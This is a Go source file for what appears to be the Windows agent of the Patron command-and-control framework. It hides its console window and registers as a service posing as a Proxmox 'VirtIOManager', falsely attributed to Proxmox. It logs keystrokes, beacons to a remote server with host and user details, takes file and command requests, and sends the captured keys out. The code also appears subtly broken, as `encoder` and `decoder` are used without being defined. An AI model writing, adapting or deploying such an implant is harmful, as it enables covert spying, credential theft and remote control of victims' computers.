package main

import (
	"crypto/tls"
	"encoding/gob"
	"fmt"
	"log"
	"syscall"
	"time"

	"github.com/PatronC2/Patron/client/client_utils"
	"github.com/PatronC2/Patron/client/client_utils/windows/keylogger"
	"github.com/PatronC2/Patron/lib/logger"
	"github.com/PatronC2/Patron/types"
	"github.com/kardianos/service"
)

var (
	ServerIP          string
	ServerPort        string
	CallbackFrequency string
	CallbackJitter    string
	RootCert          string
	LoggingEnabled    string
	cache             string
)

const (
	delayKeyfetchMS = 5
)

type program struct{}

func (p *program) Start(s service.Service) error {
	go p.run()
	return nil
}

func (p *program) Stop(s service.Service) error {
	return nil
}

func HideConsoleWindow() {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	user32 := syscall.NewLazyDLL("user32.dll")

	getConsoleWindow := kernel32.NewProc("GetConsoleWindow")
	showWindow := user32.NewProc("ShowWindow")

	hwnd, _, _ := getConsoleWindow.Call()
	if hwnd != 0 {
		showWindow.Call(hwnd, uintptr(0)) // SW_HIDE = 0
	}
}

func (p *program) run() {
	client_utils.Initialize(LoggingEnabled)
	config, err := client_utils.LoadCertificate(RootCert)
	if err != nil {
		log.Fatalf("Failed to load certificate: %v\n", err)
	}

	keylogger := keylogger.NewKeylogger()

	go func() {
		for {
			key := keylogger.GetKey()
			if !key.Empty {
				cache = cache + string(key.Rune)
				logger.Logf(logger.Info, "Current cache: %v", cache)
			}
			time.Sleep(delayKeyfetchMS * time.Millisecond)
		}
	}()

	agentID, hostname, username := client_utils.GenerateAgentMetadata()
	logger.Logf(logger.Info, "Created AgentID: %v. Hostname: %v. Username: %v", agentID, hostname, username)
	osType, osArch, osVersion, cpus, memory := client_utils.GetOSInfo()

	for {
		beacon, err := client_utils.EstablishConnection(config, ServerIP, ServerPort)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		logger.Logf(logger.Info, "Beacon connected")

		ip := client_utils.GetLocalIP(beacon)
		nextCallback := client_utils.CalculateNextCallbackTime(CallbackFrequency, CallbackJitter)
		err = client_utils.HandleConfigurationRequest(
			beacon, agentID, hostname, username, ip,
			osType, osArch, osVersion, cpus, memory,
			ServerIP, ServerPort, CallbackFrequency, CallbackJitter,
			nextCallback,
		)
		if err != nil {
			client_utils.HandleError(beacon, "configuration", err)
			continue
		}
		if err := client_utils.HandleFileRequest(beacon, agentID); err != nil {
			client_utils.HandleError(beacon, "file", err)
			continue
		}

		if err := client_utils.HandleCommandRequest(beacon, agentID); err != nil {
			client_utils.HandleError(beacon, "command", err)
			continue
		}

		if err := handleKeysRequest(beacon, encoder, decoder, agentID); err != nil {
			client_utils.HandleError(beacon, "keylogs", err)
			continue
		}

		beacon.Close()
		logger.Logf(logger.Info, "Beacon successful")
		sleepDuration := time.Until(nextCallback)

		if sleepDuration > 0 {
			logger.Logf(logger.Info, "Sleeping until next callback: %v (in %.2fs)", nextCallback.Format(time.RFC3339), sleepDuration.Seconds())
			time.Sleep(sleepDuration)
		} else {
			logger.Logf(logger.Warning, "Next callback time already passed (%.2fs ago). Skipping sleep.", -sleepDuration.Seconds())
		}
	}
}

func main() {
	HideConsoleWindow()
	svcConfig := &service.Config{
		Name:        "VirtIOManager",
		DisplayName: "VirtIOManager",
		Description: "A Windows service to manage virtualized networking in Proxmox VE. Copyright © 2004 - 2024 Proxmox Server Solutions GmbH. All rights reserved.",
	}

	prg := &program{}
	s, err := service.New(prg, svcConfig)
	if err != nil {
		log.Fatal(err)
	}

	err = s.Run()
	if err != nil {
		log.Fatal(err)
	}
}

func handleKeysRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID string) error {
	logger.Logf(logger.Info, "Sending keylogs: %v", cache)
	keyResponse := types.KeysRequest{
		AgentID: agentID,
		Keys:    cache,
	}

	if err := client_utils.SendRequest(encoder, types.KeysRequestType, keyResponse); err != nil {
		return err
	}
	var response types.Response
	if err := decoder.Decode(&response); err != nil {
		return fmt.Errorf("error decoding command response: %v", err)
	}
	cache = ""

	return nil
}
